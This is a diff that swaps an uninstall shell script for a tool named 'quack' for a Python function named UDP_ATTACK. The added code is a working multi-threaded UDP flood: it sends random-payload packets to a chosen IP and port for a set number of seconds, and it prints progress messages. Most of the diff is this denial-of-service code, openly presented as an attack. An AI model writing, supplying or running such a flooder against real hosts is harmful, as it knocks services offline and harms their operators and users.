@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env python3
 
 # MIT License
 #
@@ -22,31 +22,52 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-printf '\033]2;uninstall.sh\a'
+import random
+import time
+import socket
+from threading import Thread
 
-N="\033[1;37m"
-C="\033[0m"
+def UDP_ATTACK(threads, attack_time, target):
+	# Finish
+	global FINISH
+	FINISH = False
+	target_ip = target.split(":")[0]
+	target_port = int(target.split(":")[1])
 
-CE="\033[0m"
-RS="\033[1;31m"
-YS="\033[1;33m"
-BS="\033[1;34m"
-GNS="\033[1;32m"
+	print("[#] Attack started for " + str(attack_time) + " secounds..")
+	
 
-R="\033[1;31m"
-WS="\033[0m"
+	threads_list = []
 
-if [[ $EUID -ne 0 ]]
-then
-   sleep 1
-   echo -e ""$RS"[-] "$WHS"This script must be run as root!"$CE"" 1>&2
-   sleep 1
-   exit
-fi
+	# UDP flood
+	def udp_flood():
+		global FINISH
+		# Create socket
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		while True:
+			if FINISH:
+				break
+			# Send random payload
+			try:
+				for _ in range(16):
+					payload = random._urandom(random.randint(1, 60))
+					sock.sendto(payload, (target_ip, target_port))
+			except Exception as e:
+				print(e)
+			else:
+				print("[+] UDP random packet sent! Payload size: " + str(len(payload)))
 
-{
-rm /bin/quack
-rm /usr/local/bin/quack
-rm -rf ~/quack
-rm /data/data/com.termux/files/usr/bin/quack
-} &> /dev/null
+	# Start threads
+	for thread in range(threads):
+		print("[#] Staring thread " + str(thread))
+		t = Thread(target = udp_flood)
+		t.start()
+		threads_list.append(t)
+	# Sleep selected secounds
+	time.sleep(attack_time)
+	# Terminate threads
+	for thread in threads_list:
+		FINISH = True
+		thread.join()
+	
+	print("[!] UDP attack stopped!")
